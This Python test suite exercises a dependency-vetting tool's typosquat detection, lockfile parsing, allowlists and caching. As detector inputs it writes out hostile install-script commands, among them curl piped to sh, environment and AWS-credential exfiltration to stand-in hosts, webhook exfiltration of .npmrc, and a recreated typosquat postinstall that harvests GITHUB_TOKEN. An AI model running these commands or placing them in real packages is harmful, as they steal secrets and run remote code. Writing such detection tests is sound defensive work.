#!/usr/bin/env python3
"""Offline unit tests for depvet's pure logic. No network access needed.

Covers pure functions (distance, canon, script scan, manifest parsing,
allowlist) plus end-to-end CLI runs against local fixture files via the
DEPVET_FIXTURES hook - the full pipeline, deterministically, offline.
"""

import hashlib
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
spec = importlib.util.spec_from_file_location(
    "depvet_check", os.path.join(ROOT, "scripts", "depvet_check.py")
)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)

failures = []


def check(label, cond):
    if cond:
        print(f"  ok  {label}")
    else:
        failures.append(label)
        print(f"FAIL  {label}")


class Opts:
    fresh_days = 21


# --- levenshtein -----------------------------------------------------------
check("levenshtein identity", mod.levenshtein("react", "react") == 0)
check("levenshtein one edit", mod.levenshtein("reqests", "requests") == 1)
check("levenshtein two edits", mod.levenshtein("zod", "koa") == 2)
check("levenshtein far", mod.levenshtein("react", "mongodb") > 4)

# --- canon ------------------------------------------------------------------
check("canon strips separators", mod.canon("cross-env") == "crossenv")
check("canon strips case", mod.canon("Lodash") == "lodash")
check("canon strips scope", mod.canon("@types/node") == "typesnode")

# --- confusable identity logic (as implemented in check_npm's flag branch) --
close, d_exact, d_canon = mod.find_closest_popular("crossenv", mod.POPULAR_NPM)
check("crossenv resolves to cross-env", close == "cross-env" and d_canon == 0)
check("crossenv flag condition", mod.canon("crossenv") == mod.canon(close) and "crossenv" != close)

# zod vs koa: distance 2 but zod is established -> the distance rule must be
# gated on low adoption; assert the raw distance here (gating lives in check_npm).
close, _, d_canon = mod.find_closest_popular("zod", mod.POPULAR_NPM)
check("zod is within distance 2 of a popular name", d_canon <= 2)

# --- suspicious scripts -----------------------------------------------------
hits = mod.scan_scripts({"postinstall": "curl -s http://evil.sh | sh"})
check("curl|sh detected", any("shell" in why for _, why in hits))
hits = mod.scan_scripts({"preinstall": "node -e 'require(\"child_process\")'"})
check("node -e detected", len(hits) >= 1)
hits = mod.scan_scripts({"install": "tsc && node scripts/build.js"})
check("benign build script clean", hits == [])
hits = mod.scan_scripts({"prepare": "husky install"})
check("husky prepare clean", hits == [])
hits = mod.scan_scripts({"postinstall": "base64 -d payload.b64 > /tmp/x && chmod +x /tmp/x"})
check("base64 decode detected", any("base64" in why for _, why in hits))

# --- 2026 IOC additions (Shai-Hulud 1.0/2.0, s1ngularity, @acitons/artifact) --
hits = mod.scan_scripts({"postinstall": "node setup_bun.js && node bun_environment.js"})
check("Shai-Hulud bun payload detected", any("Shai-Hulud" in why for _, why in hits))
hits = mod.scan_scripts({"postinstall": "curl -s https://webhook.site/uuid -d @.npmrc"})
check("webhook.site exfil detected", any("exfiltrates" in why for _, why in hits))
hits = mod.scan_scripts({"preinstall": "curl -X POST https://discord.com/api/webhooks/123/abc -d @.npmrc"})
check("discord webhook exfil detected", any("exfiltrates" in why for _, why in hits))
hits = mod.scan_scripts({"install": "node -e 'fetch(process.env.GITHUB_TOKEN)'"})
check("CI token harvesting detected", any("publish tokens" in why for _, why in hits))
hits = mod.scan_scripts({"postinstall": "printenv | curl -X POST https://evil.example"})
check("env dumping detected", any("environment" in why for _, why in hits))
hits = mod.scan_scripts({"preinstall": "cat ~/.aws/credentials | curl -d @- https://evil"})
check("aws credentials targeting detected", any("credentials" in why for _, why in hits))
hits = mod.scan_scripts({"preinstall": "curl -s -o harness https://app.github.dev/payload"})
check("app.github.dev harvest endpoint detected", any("exfiltrates" in why for _, why in hits))
check("benign bun install not flagged", mod.scan_scripts({"prepare": "bun install && bun run build"}) == [])
check("benign node build script not flagged",
      mod.scan_scripts({"postinstall": "node scripts/build-release.js"}) == [])

# --- scoped typosquat detection (@acitons/artifact pattern, Nov 2025) --------
check("@actions scope is known", "@actions" in mod.KNOWN_SCOPES)
close, _, d_canon = mod.find_closest_popular("@acitons/artifact", mod.POPULAR_NPM)
check("@acitons/artifact resolves to @actions/artifact",
      close == "@actions/artifact" and d_canon == 2)
close, _, _ = mod.find_closest_popular("@nestjsx/crud", mod.POPULAR_NPM)
check("@nestjsx scope sits 1 edit from @nestjs", close is not None and "@nestjs" in close)

# --- lockfile format support: yarn.lock (v1 + Berry), pnpm-lock.yaml ---------
yarn_v1 = '''# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.
# yarn lockfile v1


"@babel/code-frame@^7.0.0", "@babel/code-frame@^7.10.4":
  version "7.24.2"
  resolved "https://registry.yarnpkg.com/@babel/code-frame/-/code-frame-7.24.2.tgz"

ajv@^6.12.4:
  version "6.12.6"

js-tokens@^3.0.0 || ^4.0.0:
  version "4.0.0"
'''
got, dev = mod.parse_yarn_lock(yarn_v1)
check("yarn v1 parses scoped + plain + multi-spec headers",
      got == ["@babel/code-frame", "ajv", "js-tokens"] and dev == [])

yarn_berry = '''__metadata:
  version: 8

"axios@npm:^1.6.0":
  version: 1.6.8
  resolution: "axios@npm:1.6.8"

"@babel/core@npm:^7.24.0":
  version: 7.24.7
  resolution: "@babel/core@npm:7.24.7"

"pkg-alias@npm:bar@^1.0.0":
  version: 1.2.3
  resolution: "bar@npm:1.2.3"
'''
got, dev = mod.parse_yarn_lock(yarn_berry)
check("yarn Berry parses npm: specs, resolutions and aliases",
      got == ["@babel/core", "axios", "bar"] and dev == [])

pnpm_v9 = '''lockfileVersion: '9.0'

dependencies:
  axios:
    specifier: ^1.6.0
    version: 1.6.8

devDependencies:
  typescript:
    specifier: ^5
    version: 5.4.5

packages:

  accepts@1.3.8:
    dev: false

  '@babel/core@7.24.0':
    dev: false

snapshots:

  axios@1.6.0(underscore@1.13.2):
    dependencies:
      follow-redirects: 1.15.6

  '@babel/core@7.24.0(core-js@3.6.5)':
    dependencies:
      convert-source-map: 2.0.0
'''
got, dev = mod.parse_pnpm_lock(pnpm_v9)
check("pnpm v9 parses packages + snapshots + peer suffixes",
      got == ["@babel/core", "accepts", "axios", "typescript"])
check("pnpm devDependencies feed dev_names", dev == ["typescript"])

pnpm_v5 = "lockfileVersion: 5.4\ndependencies:\n  axios: 0.21.1\ndevDependencies:\n  '@types/node': 20.0.0\n"
got, dev = mod.parse_pnpm_lock(pnpm_v5)
check("pnpm v5 inline values parse", got == ["@types/node", "axios"] and dev == ["@types/node"])

check("_spec_name alias targets real package",
      mod._spec_name('"foo@npm:bar@^1.0.0"') == "bar")
check("_spec_name drops git/url specs", mod._spec_name('"git+ssh://x@y/z"') is None)
check("_spec_name drops __metadata", mod._spec_name("__metadata") is None)

# parse_lockfile dispatch: filename + content sniffing for unknown names
with tempfile.TemporaryDirectory() as td:
    yp = os.path.join(td, "yarn.lock")
    with open(yp, "w") as fh:
        fh.write(yarn_v1)
    entries = mod.parse_lockfile(yp, yarn_v1)
    check("dispatch by filename: yarn.lock", [n for n, _ in entries] == ["@babel/code-frame", "ajv", "js-tokens"])
    pp = os.path.join(td, "pnpm-lock.yaml")
    with open(pp, "w") as fh:
        fh.write(pnpm_v9)
    entries = mod.parse_lockfile(pp, pnpm_v9)
    check("dispatch by filename: pnpm-lock.yaml", "axios" in [n for n, _ in entries])
    up = os.path.join(td, "weird-name")
    with open(up, "w") as fh:
        fh.write(pnpm_v9)
    entries = mod.parse_lockfile(up, pnpm_v9)
    check("unknown filename sniffs pnpm content", "axios" in [n for n, _ in entries])
    up2 = os.path.join(td, "weird-name2")
    with open(up2, "w") as fh:
        fh.write(yarn_v1)
    entries = mod.parse_lockfile(up2, yarn_v1)
    check("unknown filename sniffs yarn content", "ajv" in [n for n, _ in entries])
    try:
        mod.parse_lockfile(os.path.join(td, "mystery"), "hello world\nnot a lockfile\n")
        check("unknown format raises ValueError", False)
    except ValueError:
        check("unknown format raises ValueError", True)

# --- dev-only entries + --production filtering --------------------------------
lock_dev = {
    "name": "app", "lockfileVersion": 3,
    "packages": {
        "": {"name": "app", "dependencies": {"safe-lib": "^1.0.0"},
              "devDependencies": {"devtool": "^2.0.0"}},
        "node_modules/safe-lib": {"version": "1.0.0"},
        "node_modules/devtool": {"version": "2.0.0", "dev": True},
        "node_modules/mixed-dep": {"version": "3.0.0"},
        "node_modules/devonly-nested": {"version": "0.9.0", "devOptional": True},
    },
}
entries = mod.parse_package_lock_entries(lock_dev)
check("lock entries carry dev flags", dict(entries)["devtool"] is True and dict(entries)["safe-lib"] is False)
check("devOptional counts as dev", dict(entries)["devonly-nested"] is True)
dd = mod.split_prod_dev(entries)
check("split_prod_dev marks dev-only", dd["devtool"] is True and dd["safe-lib"] is False)
check("back-compat parse_package_lock still returns names",
      mod.parse_package_lock(lock_dev) == ["devonly-nested", "devtool", "mixed-dep", "safe-lib"])
lock_v1_dev = {
    "lockfileVersion": 1,
    "dependencies": {
        "prod-lib": {"version": "1.0.0"},
        "dev-tool": {"version": "2.0.0", "dev": True,
                     "dependencies": {"dev-subdep": {"version": "2.1.0"}}},
    },
}
dd = mod.split_prod_dev(mod.parse_package_lock_entries(lock_v1_dev))
check("v1 dev flag inherits to subtree", dd["dev-tool"] is True and dd["dev-subdep"] is True
      and dd["prod-lib"] is False)
lock_mixed = {"lockfileVersion": 3, "packages": {
    "node_modules/mixed-dep": {"version": "1.0.0", "dev": True},
    "node_modules/a/node_modules/mixed-dep": {"version": "1.0.0"},
}}
check("mixed prod+dev occurrences are not dev-only",
      mod.split_prod_dev(mod.parse_package_lock_entries(lock_mixed))["mixed-dep"] is False)

# --- thresholds --------------------------------------------------------------
check("fresh profile: 5d old + 20 dl/wk flags", 5 < Opts.fresh_days and 20 < 100)
check("established: 400d old does not flag", not (400 < Opts.fresh_days))

# --- plumbing ----------------------------------------------------------------
check("empty_meta has no verdict key", "verdict" not in mod.empty_meta())
check("ORDER sorts BLOCK first", list(sorted(mod.ORDER, key=lambda k: mod.ORDER[k]))[0] == "BLOCK")

# --- package-lock.json parsing (v1 / v2 / v3) ---------------------------------
lock_v3 = {
    "name": "app", "lockfileVersion": 3,
    "packages": {
        "": {"name": "app", "dependencies": {"safe-lib": "^1.0.0"}},
        "node_modules/safe-lib": {"version": "1.0.0"},
        "node_modules/ghost-lib": {"version": "0.1.0"},
        "node_modules/safe-lib/node_modules/nested-pkg": {"version": "2.0.0"},
    },
}
names = mod.parse_package_lock(lock_v3)
check("lock v3 extracts flat deps", names == ["ghost-lib", "nested-pkg", "safe-lib"])
check("lock v3 ignores root entry", "" not in names and "app" not in names)

lock_v1 = {
    "lockfileVersion": 1,
    "dependencies": {
        "safe-lib": {"version": "1.0.0", "dependencies": {"ghost-lib": {"version": "0.1.0"}}},
        "deduped": {"version": "3.0.0"},
    },
}
check("lock v1 walks recursive tree",
      mod.parse_package_lock(lock_v1) == ["deduped", "ghost-lib", "safe-lib"])
check("empty lock yields no names", mod.parse_package_lock({"lockfileVersion": 3}) == [])

# --- requirements.txt parsing --------------------------------------------------
req_lines = [
    "# core deps",
    "requests==2.31.0",
    "click>=8.0 ; python_version >= '3.8'",
    "rich[sqla]",
    "-e ./editable",
    "-r base.txt",
    "--index-url https://pypi.org/simple",
    "git+https://github.com/x/y.git#egg=z",
    "",
    "numpy~=1.26",
]
check("requirements parses names", mod.parse_requirements(req_lines) == ["click", "numpy", "requests", "rich"])
check("requirements line keeps bare name", mod.parse_requirements_line("flask") == "flask")
check("requirements drops VCS/URL lines", mod.parse_requirements_line("https://x/y.whl") is None)

# --- allowlist -----------------------------------------------------------------
allow = {"deprecated-lib": "audited 2026-11, accepted single-maintainer WARN"}
res = [{"name": "deprecated-lib", "verdict": "WARN", "notes": []},
       {"name": "ghost-lib", "verdict": "BLOCK", "notes": []},
       {"name": "safe-lib", "verdict": "WARN", "notes": []}]
out = mod.apply_allowlist(res, allow)
check("allowlist downgrades matching WARN", out[0]["verdict"] == "PASS")
check("allowlist records reason in notes", any("allowlist" in n for n in out[0]["notes"]))
check("allowlist never downgrades BLOCK", out[1]["verdict"] == "BLOCK")
check("allowlist leaves unmatched packages", out[2]["verdict"] == "WARN")
check("apply_allowlist no-op on empty map", mod.apply_allowlist(res, {})[1]["verdict"] == "BLOCK")

with tempfile.TemporaryDirectory() as td:
    rc = os.path.join(td, ".depvetrc.json")
    with open(rc, "w") as fh:
        json.dump({"allow": {"x": "reviewed"}}, fh)
    check("load_allowlist reads rc file", mod.load_allowlist(rc) == {"x": "reviewed"})
    check("load_allowlist missing file -> {}", mod.load_allowlist(os.path.join(td, "nope.json")) == {})
    with open(rc, "w") as fh:
        fh.write("{broken json")
    check("load_allowlist broken file -> None", mod.load_allowlist(rc) is None)

# --------------------------------------------------------------------------
# End-to-end CLI runs against local fixtures (DEPVET_FIXTURES hook)
# --------------------------------------------------------------------------

def fixture_dir(url: str, body: str, base: str) -> str:
    fname = hashlib.sha256(url.encode("utf-8")).hexdigest()[:24] + ".json"
    with open(os.path.join(base, fname), "w") as fh:
        fh.write(body)
    return fname

NPM_META = "https://registry.npmjs.org/{}"
NPM_DL = "https://api.npmjs.org/downloads/point/last-week/{}"
PYPI_META = "https://pypi.org/pypi/{}/json"


def npm_packument(deprecated=None, n_maint=2, age_created="2020-01-01T00:00:00Z",
                  latest_time="2026-11-01T00:00:00Z", attestations=False,
                  scripts=None, with_repo=True):
    latest = {"license": "MIT", "scripts": scripts or {}}
    if with_repo:
        latest["repository"] = {"url": "git+https://github.com/x/y.git"}
    if deprecated:
        latest["deprecated"] = deprecated
    if attestations:
        latest["dist"] = {"attestations": {"url": "https://example.internal"}}
    return json.dumps({
        "dist-tags": {"latest": "1.0.0"},
        "time": {"created": age_created, "1.0.0": latest_time},
        "maintainers": [{} for _ in range(n_maint)],
        "versions": {"1.0.0": latest},
    })


tmp = tempfile.mkdtemp(prefix="depvet-fixtures-")
try:
    fixture_dir(NPM_META.format("safe-lib"), npm_packument(), tmp)
    fixture_dir(NPM_DL.format("safe-lib"), json.dumps({"downloads": 90000}), tmp)
    fixture_dir(NPM_META.format("deprecated-lib"), npm_packument(deprecated="use safe-lib instead", n_maint=1), tmp)
    fixture_dir(NPM_DL.format("deprecated-lib"), json.dumps({"downloads": 3000}), tmp)
    fixture_dir(NPM_META.format("ghost-lib"), "404", tmp)
    fixture_dir(NPM_DL.format("ghost-lib"), json.dumps({"downloads": 0}), tmp)
    fixture_dir(PYPI_META.format("requests"),
                json.dumps({"info": {"version": "2.31.0", "license": "Apache-2.0",
                                     "project_urls": {"Homepage": "https://requests.io"}},
                            "releases": {"1.0.0": [{"upload_time_iso_8601": "2020-01-01T00:00:00Z",
                                                    "yanked": False}],
                                         "1.5.0": [{"upload_time_iso_8601": "2023-06-01T00:00:00Z",
                                                    "yanked": False}],
                                         "2.31.0": [{"upload_time_iso_8601": "2026-10-01T00:00:00Z",
                                                     "yanked": False}]}}), tmp)
    fixture_dir(PYPI_META.format("yankme"),
                json.dumps({"info": {"version": "1.0.0", "license": "MIT",
                                     "project_urls": {"Homepage": "https://y.io"}},
                            "releases": {"1.0.0": [{"upload_time_iso_8601": "2020-01-01T00:00:00Z",
                                                    "yanked": True}]}}), tmp)
    # @acitons/artifact: the Nov 2025 scoped typosquat of @actions/artifact
    # (rebuilt here with its real profile: brand-new, tiny adoption, lone
    # maintainer, no repo, a postinstall that harvests and calls home)
    fixture_dir(NPM_META.format("@acitons%2Fartifact"),
                npm_packument(n_maint=1, age_created="2026-11-09T00:00:00Z",
                              latest_time="2026-11-09T00:00:00Z", with_repo=False,
                              scripts={"postinstall": "curl -s -o harness https://app.github.dev/p && "
                                       "node -e 'post(process.env.GITHUB_TOKEN)'"}), tmp)
    fixture_dir(NPM_DL.format("@acitons%2Fartifact"), json.dumps({"downloads": 40}), tmp)
    # devtool: nonexistent on the registry -> BLOCK unless --production skips it
    fixture_dir(NPM_META.format("devtool"), "404", tmp)

    SCRIPT = os.path.join(ROOT, "scripts", "depvet_check.py")
    base_env = dict(os.environ, DEPVET_FIXTURES=tmp)

    def run_cli(args, cwd=None):
        return subprocess.run([sys.executable, SCRIPT] + args, capture_output=True,
                              text=True, env=base_env, cwd=cwd, timeout=60)

    # JSON pipeline: verdicts, per-result registry, exit codes
    p = run_cli(["--json", "--max-delay", "0", "safe-lib", "deprecated-lib", "ghost-lib"])
    check("cli json exit 2 on BLOCK", p.returncode == 2)
    out = json.loads(p.stdout)
    verdicts = {r["name"]: r["verdict"] for r in out["results"]}
    check("cli safe-lib PASS", verdicts["safe-lib"] == "PASS")
    check("cli deprecated-lib WARN", verdicts["deprecated-lib"] == "WARN")
    check("cli ghost-lib BLOCK (404)", verdicts["ghost-lib"] == "BLOCK")
    check("cli results carry registry field", all(r.get("registry") == "npm" for r in out["results"]))
    dep_r = next(r for r in out["results"] if r["name"] == "deprecated-lib")
    check("cli deprecated warning surfaced", any("deprecated on npm" in w for w in dep_r["warnings"]))
    check("cli new-fresh provenance warn only for young", not any("provenance" in w for w in dep_r["warnings"]))

    # --strict escalates WARN
    p = run_cli(["--json", "--strict", "--max-delay", "0", "deprecated-lib"])
    check("cli --strict exit 1 on WARN", p.returncode == 1)

    # allowlist via rc file in cwd
    cwd2 = tempfile.mkdtemp(prefix="depvet-cwd-")
    try:
        with open(os.path.join(cwd2, ".depvetrc.json"), "w") as fh:
            json.dump({"allow": {"deprecated-lib": "audited 2026-11"}}, fh)
        p = run_cli(["--json", "--max-delay", "0", "deprecated-lib"], cwd=cwd2)
        out = json.loads(p.stdout)
        r = next(r for r in out["results"] if r["name"] == "deprecated-lib")
        check("rc allowlist downgrades WARN to PASS", r["verdict"] == "PASS")
        check("rc allowlist notes reason", any("audited 2026-11" in n for n in r["notes"]))
        check("rc allowlist exit 0", p.returncode == 0)
    finally:
        shutil.rmtree(cwd2, ignore_errors=True)

    # --allow flag; BLOCK stays BLOCK even if allowlisted
    p = run_cli(["--json", "--max-delay", "0", "--allow", "ghost-lib", "ghost-lib"])
    out = json.loads(p.stdout)
    check("--allow cannot rescue a BLOCK", out["results"][0]["verdict"] == "BLOCK")

    # lockfile mode (v3, with nested dep)
    lockpath = os.path.join(tmp, "package-lock.json")
    with open(lockpath, "w") as fh:
        json.dump(lock_v3, fh)
    p = run_cli(["--json", "--max-delay", "0", "--lockfile", lockpath])
    out = json.loads(p.stdout)
    got = sorted(r["name"] for r in out["results"])
    check("lockfile mode scans every dep incl nested", got == ["ghost-lib", "nested-pkg", "safe-lib"])
    check("lockfile mode records source", any("package-lock.json" in s for s in out.get("sources", [])))
    check("lockfile mode exit 2 (ghost-lib)", p.returncode == 2)

    # requirements mode -> pypi, yanked warning
    reqpath = os.path.join(tmp, "requirements.txt")
    with open(reqpath, "w") as fh:
        fh.write("# comment\nrequests==2.31.0\nyankme>=1.0\n")
    p = run_cli(["--json", "--max-delay", "0", "--requirements", reqpath])
    out = json.loads(p.stdout)
    got = {r["name"]: r for r in out["results"]}
    check("requirements mode maps to pypi", all(r.get("registry") == "pypi" for r in out["results"]))
    check("requirements mode scans parsed names", set(got) == {"requests", "yankme"})
    check("yanked latest release warns", any("yanked" in w for w in got["yankme"]["warnings"]))
    check("requests passes on pypi", got["requests"]["verdict"] == "PASS")
    check("requirements mode exit 0 without strict", p.returncode == 0)

    # scoped typosquat, end to end: @acitons/artifact must BLOCK and point at
    # the real @actions/artifact
    p = run_cli(["--json", "--max-delay", "0", "@acitons/artifact"])
    out = json.loads(p.stdout)
    r = out["results"][0]
    check("cli @acitons/artifact BLOCKs", r["verdict"] == "BLOCK")
    check("cli @acitons distance flag points at @actions/artifact",
          any("@actions/artifact" in f for f in r["flags"]))
    check("cli @acitons scope warning fires",
          any("scoped typosquat" in w for w in r["warnings"]))
    check("cli @acitons install-script flags fire",
          any("postinstall" in f for f in r["flags"]))

    # --production: dev-flagged lockfile entries are skipped
    lockdevpath = os.path.join(tmp, "lock-with-dev.json")
    with open(lockdevpath, "w") as fh:
        json.dump({"lockfileVersion": 3, "packages": {
            "": {"name": "app"},
            "node_modules/safe-lib": {"version": "1.0.0"},
            "node_modules/devtool": {"version": "2.0.0", "dev": True},
        }}, fh)
    fixture_dir("https://api.npmjs.org/downloads/point/last-week/devtool,safe-lib",
                json.dumps({"devtool": None, "safe-lib": {"downloads": 90000}}), tmp)
    p = run_cli(["--json", "--max-delay", "0", "--lockfile", lockdevpath])
    out = json.loads(p.stdout)
    got = {r["name"]: r["verdict"] for r in out["results"]}
    check("without --production devtool is scanned and BLOCKs",
          got.get("devtool") == "BLOCK" and p.returncode == 2)
    p = run_cli(["--json", "--max-delay", "0", "--production", "--lockfile", lockdevpath])
    out = json.loads(p.stdout)
    got = {r["name"] for r in out["results"]}
    check("--production skips devtool", "devtool" not in got and p.returncode == 0)
    check("--production source notes the skip",
          any("dev-only skipped" in s for s in out.get("sources", [])))

    # table alignment: every data row's AGE column starts where the header's does
    p = run_cli(["--max-delay", "0", "safe-lib", "deprecated-lib"])
    lines = re.sub(r"\033\[[0-9;]*m", "", p.stdout).splitlines()
    hdr = lines[0]
    # "AGE" also occurs inside "PACKAGE" - locate it after the VERDICT column
    col_age = hdr.find("VERDICT") + len("VERDICT") + 2
    assert hdr[col_age:col_age + 3] == "AGE"
    verdict_rows = []
    for ln in lines[1:]:
        cells = ln.split()
        if len(cells) >= 2 and cells[1] in ("PASS", "WARN", "BLOCK", "ERROR"):
            verdict_rows.append(ln)
    ages_at_col = []
    for ln in verdict_rows:
        cells = ln.split()
        age_tok = next(c for c in cells if c.endswith("d") or c == "?")
        ages_at_col.append(ln.find(age_tok) == col_age)
    check("table rows align with header columns", verdict_rows and all(ages_at_col))
finally:
    shutil.rmtree(tmp, ignore_errors=True)

# --------------------------------------------------------------------------
# Performance layer: bulk download counts, disk cache, pooled HTTP with
# keep-alive, redirects, gzip, stale-connection retry - plus end-to-end
# concurrency and caching against a local loopback HTTP server (still offline:
# nothing leaves 127.0.0.1).
# --------------------------------------------------------------------------

import gzip as _gzip
import threading as _threading
import urllib.parse as _urlparse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

check("bulk_chunks splits by 128",
      [len(c) for c in mod.bulk_chunks(list(range(300)))] == [128, 128, 44])
check("bulk_chunks handles empty input", mod.bulk_chunks([]) == [])

m = mod.parse_bulk_downloads(
    {"a": {"downloads": 5}, "b": None, "c": {"error": "package not found"}},
    ["a", "b", "c", "d"])
check("bulk parse keeps integer counts", m["a"] == 5)
check("bulk parse null/error/missing -> None",
      m["b"] is None and m["c"] is None and m["d"] is None)

# bulk endpoint served through the fixtures hook
with tempfile.TemporaryDirectory() as fxdir:
    bulk_url = "https://api.npmjs.org/downloads/point/last-week/bulk-a,bulk-b,bulk-c"
    fname = hashlib.sha256(bulk_url.encode()).hexdigest()[:24] + ".json"
    with open(os.path.join(fxdir, fname), "w") as fh:
        fh.write(json.dumps({"bulk-a": {"downloads": 10}, "bulk-b": {"downloads": 20},
                             "bulk-c": {"error": "package not found"}}))
    old_fx = os.environ.get("DEPVET_FIXTURES")
    os.environ["DEPVET_FIXTURES"] = fxdir
    try:
        got = mod.fetch_weekly_bulk(["bulk-a", "bulk-b", "bulk-c"])
    finally:
        if old_fx is None:
            os.environ.pop("DEPVET_FIXTURES", None)
        else:
            os.environ["DEPVET_FIXTURES"] = old_fx
    check("bulk fetch via fixtures: ints kept, errors -> None",
          got == {"bulk-a": 10, "bulk-b": 20, "bulk-c": None})

# disk cache: roundtrip, TTL, corruption
with tempfile.TemporaryDirectory() as cd:
    old_cd = os.environ.get("DEPVET_CACHE_DIR")
    os.environ["DEPVET_CACHE_DIR"] = cd
    try:
        row = {"name": "cache-pkg", "verdict": "WARN", "flags": [],
               "warnings": ["w"], "notes": ["n"]}
        mod.cache_put("npm", "Cache-Pkg", row)
        got = mod.cache_get("npm", "cache-pkg", 3600)
        check("cache roundtrip is case-insensitive on name", got == row)
        check("cache miss for unknown name", mod.cache_get("npm", "unknown-pkg", 3600) is None)
        check("cache ttl expiry honored", mod.cache_get("npm", "cache-pkg", -1) is None)
        bad = mod._cache_path("npm", "broken-pkg")
        os.makedirs(os.path.dirname(bad), exist_ok=True)
        with open(bad, "w") as fh:
            fh.write("{definitely not json")
        check("cache corrupt entry -> miss", mod.cache_get("npm", "broken-pkg", 3600) is None)
    finally:
        if old_cd is None:
            os.environ.pop("DEPVET_CACHE_DIR", None)
        else:
            os.environ["DEPVET_CACHE_DIR"] = old_cd

STATS = {"conn": 0, "req": 0, "stale_seen": 0}


class FakeRegistry(BaseHTTPRequestHandler):
    """Minimal npm-ish registry over loopback HTTP/1.1 with keep-alive."""
    protocol_version = "HTTP/1.1"

    def setup(self):
        STATS["conn"] += 1
        super().setup()

    def log_message(self, *args):
        pass

    def _send(self, code, body=b"", extra=None):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        if body:
            self.wfile.write(body)

    def do_GET(self):
        STATS["req"] += 1
        p = self.path.split("?")[0]
        if p == "/stale":
            if STATS["stale_seen"] == 0:
                STATS["stale_seen"] = 1
                self.close_connection = True
                return  # close without answering -> stale keep-alive socket
            self._send(200, b'{"ok": true}')
        elif p == "/redirect":
            self._send(301, extra={"Location": "/redirect-target"})
        elif p == "/redirect-target":
            self._send(200, b"moved-ok")
        elif p == "/gzip":
            self._send(200, _gzip.compress(b'{"hello": "gzipped"}'),
                       extra={"Content-Encoding": "gzip"})
        elif p == "/stats":
            self._send(200, json.dumps(STATS).encode())
        elif p.startswith("/pkg/"):
            name = _urlparse.unquote(p[5:])
            if name == "ghost-pkg":
                self._send(404, b'{"error": "Not Found"}')
            else:
                self._send(200, npm_packument().encode())
        elif p.startswith("/dl/"):
            out = {}
            for n in _urlparse.unquote(p[4:]).split(","):
                out[n] = {"downloads": 0 if n == "ghost-pkg" else 12000}
            self._send(200, json.dumps(out).encode())
        else:
            self._send(404, b'{"error": "no route"}')


srv = ThreadingHTTPServer(("127.0.0.1", 0), FakeRegistry)
srv.daemon_threads = True
PORT = srv.server_address[1]
_threading.Thread(target=srv.serve_forever, daemon=True).start()
try:
    err, body = mod.fetch_raw("http://127.0.0.1:{}/redirect".format(PORT))
    check("fetch_raw follows redirects", err is None and body == b"moved-ok")

    err, body = mod.fetch_raw("http://127.0.0.1:{}/gzip".format(PORT))
    check("fetch_raw decodes gzip bodies",
          err is None and json.loads(body.decode())["hello"] == "gzipped")

    err, body = mod.fetch_raw("http://127.0.0.1:{}/pkg/ghost-pkg".format(PORT))
    check("fetch_raw maps 404 to notfound", err == "notfound" and body is None)

    err, body = mod.fetch_raw("http://127.0.0.1:{}/stale".format(PORT))
    check("fetch_raw recovers from a stale keep-alive socket",
          err is None and body == b'{"ok": true}' and STATS["stale_seen"] == 1)

    before_req, before_conn = STATS["req"], STATS["conn"]
    for _ in range(8):
        err, body = mod.fetch_raw("http://127.0.0.1:{}/stats".format(PORT))
        assert err is None
    check("keep-alive reuses one connection across 8 requests",
          STATS["req"] - before_req == 8 and STATS["conn"] - before_conn <= 1)

    # End-to-end CLI over loopback (no fixtures): concurrency, bulk, cache.
    SCRIPT = os.path.join(ROOT, "scripts", "depvet_check.py")
    with tempfile.TemporaryDirectory() as cache_dir:
        env = {k: v for k, v in os.environ.items() if k != "DEPVET_FIXTURES"}
        env.update(
            DEPVET_NPM_REGISTRY="http://127.0.0.1:{}/pkg".format(PORT),
            DEPVET_NPM_DOWNLOADS="http://127.0.0.1:{}/dl".format(PORT),
            DEPVET_CACHE_DIR=cache_dir,
        )

        def run_cli_net(args):
            return subprocess.run([sys.executable, SCRIPT] + args, capture_output=True,
                                  text=True, env=env, timeout=60)

        STATS.update(conn=0, req=0, stale_seen=0)
        p = run_cli_net(["--json", "safe-lib", "warm-lib", "cool-lib", "ghost-pkg"])
        check("loopback cli exit 2 on BLOCK", p.returncode == 2)
        out = json.loads(p.stdout)
        v = {r["name"]: r["verdict"] for r in out["results"]}
        check("loopback cli verdicts",
              v == {"safe-lib": "PASS", "warm-lib": "PASS", "cool-lib": "PASS",
                    "ghost-pkg": "BLOCK"})
        reqs_first = STATS["req"]
        # 4 metadata + 1 bulk downloads request; the 404 never needs downloads
        check("loopback cli request count = bulk(1) + metadata(4)", reqs_first == 5)

        p2 = run_cli_net(["--json", "safe-lib", "warm-lib", "cool-lib", "ghost-pkg"])
        out2 = json.loads(p2.stdout)
        v2 = {r["name"]: r["verdict"] for r in out2["results"]}
        check("cached run returns identical verdicts", v2 == v)
        check("cached run makes zero server requests", STATS["req"] == reqs_first)

        p3 = run_cli_net(["--json", "--no-cache", "safe-lib"])
        json.loads(p3.stdout)
        check("--no-cache queries the registry again", STATS["req"] == reqs_first + 2)

        with tempfile.TemporaryDirectory() as cd2:
            env2 = dict(env, DEPVET_CACHE_DIR=cd2)
            p4 = subprocess.run([sys.executable, SCRIPT, "--json", "--workers", "1",
                                 "safe-lib", "ghost-pkg"], capture_output=True,
                                text=True, env=env2, timeout=60)
            out4 = json.loads(p4.stdout)
            v4 = {r["name"]: r["verdict"] for r in out4["results"]}
            check("serial --workers 1 matches concurrent verdicts",
                  p4.returncode == 2 and v4["ghost-pkg"] == "BLOCK"
                  and v4["safe-lib"] == "PASS")
finally:
    srv.shutdown()
    srv.server_close()

print()
if failures:
    print(f"{len(failures)} test(s) failed:", *failures, sep="\n  - ")
    sys.exit(1)
print("all offline tests passed")
